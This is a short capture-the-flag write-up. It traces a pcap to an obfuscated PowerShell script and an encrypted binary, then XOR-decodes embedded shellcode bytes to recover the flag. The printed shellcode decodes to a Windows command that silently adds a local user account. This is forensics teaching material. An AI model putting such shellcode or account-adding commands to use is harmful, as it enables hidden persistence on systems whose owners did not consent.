# Poof

Solved by: @oneonlyzero

## Question:
Yet another pcap, no usb traffic in this one so I'm lost. Can you help me out? :)
## Solution:
Open the pcap file -> Extract Http object -> Got 2 files (bin and ps1 file) -> Deobfuscate ps1 file for better view -> get the  key to decrypt the bin file -> decrypt the bin file and save as exe file -> identify the exe type -> use decompiler tools -> find the main/entry point of the exe file -> decode the flag

* https://github.com/Malandrone/PowerDecode

```
byte_array = [
    129, 149, 255, 125, 125, 125, 29, 244, 152, 76, 189, 25, 246, 45, 77, 246, 
    47, 113, 246, 47, 105, 246, 15, 85, 114, 202, 55, 91, 76, 130, 209, 65, 
    28, 1, 127, 81, 93, 188, 178, 112, 124, 186, 159, 143, 47, 42, 246, 47, 
    109, 246, 55, 65, 246, 49, 108, 5, 158, 53, 124, 172, 44, 246, 36, 93, 
    124, 174, 246, 52, 101, 158, 71, 52, 246, 73, 246, 124, 171, 76, 130, 
    209, 188, 178, 112, 124, 186, 69, 157, 8, 139, 126, 0, 133, 70, 0, 89, 
    8, 153, 37, 246, 37, 89, 124, 174, 27, 246, 113, 54, 246, 37, 97, 124, 
    174, 246, 121, 246, 124, 173, 244, 57, 89, 89, 38, 38, 28, 36, 39, 44, 
    130, 157, 34, 34, 39, 246, 111, 150, 240, 32, 23, 124, 240, 248, 207, 
    125, 125, 125, 45, 21, 76, 246, 18, 250, 130, 168, 198, 141, 200, 223, 
    43, 21, 219, 232, 192, 224, 130, 168, 65, 123, 1, 119, 253, 134, 157, 
    8, 120, 198, 58, 110, 15, 18, 23, 125, 46, 130, 168, 30, 16, 25, 93, 
    82, 30, 93, 19, 24, 9, 93, 8, 14, 24, 15, 93, 17, 24, 26, 20, 9, 8, 
    14, 24, 15, 93, 8, 18, 27, 9, 30, 9, 27, 6, 42, 73, 14, 34, 76, 41, 
    34, 47, 78, 28, 17, 17, 4, 34, 28, 51, 34, 52, 16, 13, 17, 73, 19, 
    9, 66, 66, 0, 93, 82, 28, 25, 25, 93, 82, 4, 125
]

decoded_bytes = [byte ^ 125 for byte in byte_array]

decoded_text = ''.join(chr(byte) for byte in decoded_bytes if 32 <= byte <= 126) 

print(decoded_text) 

1dP0RRr(J&1<a|, RWRJ<LxHQY I:I418u};}$uXX$fKXD$$[[aYZQ__Z]jPh1oVh<|uGrojScmd /c net user legituser uoftctf{W4s_1T_R3ally_aN_Impl4nt??} /add /y
```

**Flag:** `uoftctf{W4s_1T_R3ally_aN_Impl4nt??}`
